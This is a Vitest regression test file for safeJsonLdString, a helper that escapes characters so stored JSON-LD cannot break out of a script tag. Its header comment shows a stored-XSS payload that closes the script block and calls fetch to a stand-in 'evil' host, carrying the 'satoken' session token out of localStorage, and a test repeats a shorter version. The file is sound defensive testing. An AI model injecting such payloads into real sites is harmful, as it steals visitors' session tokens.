/**
 * INV-FE-001 回归测试：safeJsonLdString 必须把会闭合 <script> 块的字符
 * 转义成 \uXXXX 字面 6 字符序列，让浏览器 HTML 解析器看不到 `<` `>`。
 *
 * 攻击载荷：
 *   bio = `</script><script>fetch("https://evil/?t="+localStorage.getItem("satoken"))</script>`
 *
 * JSON.stringify 默认输出原文，浏览器看到 `</script>` 就闭合 script block，
 * 接着把后续 `<script>` 当 inline JS 执行——典型 stored XSS。
 * safeJsonLdString 把所有 `<` 转成字面 6 字符 `\u003c`，浏览器看不到原始 `<`。
 */
import { describe, expect, test } from "vitest";
import { safeJsonLdString } from "../lib/json-ld";

describe("safeJsonLdString", () => {
  test("转义攻击载荷 </script> 不再出现在输出里", () => {
    const payload = {
      bio: `</script><script>fetch("https://evil")</script>`,
    };
    const out = safeJsonLdString(payload);
    expect(out).not.toContain("</script>");
    expect(out).not.toContain("<script>");
    // 必须包含字面转义形式（6 字符）
    expect(out).toContain("\\u003c");
  });

  test("普通对象仍是合法 JSON（JSON.parse 能还原）", () => {
    const original = {
      name: "Involution Hell",
      url: "https://involutionhell.com",
    };
    const out = safeJsonLdString(original);
    expect(JSON.parse(out)).toEqual(original);
  });

  test("user-generated 字段含 < > & 都被转义", () => {
    const out = safeJsonLdString({ field: "a<b>c&d" });
    expect(out).not.toContain("<");
    expect(out).not.toContain(">");
    // & 也应该被转义为字面 `\\u0026`
    expect(out).toContain("\\u0026");
  });

  test("JSON.parse 后还能拿到原始用户输入（往返保真）", () => {
    const original = { bio: `恶意</script>载荷 with <b> & 'quotes'` };
    const out = safeJsonLdString(original);
    const parsed = JSON.parse(out);
    expect(parsed.bio).toBe(original.bio);
  });
});
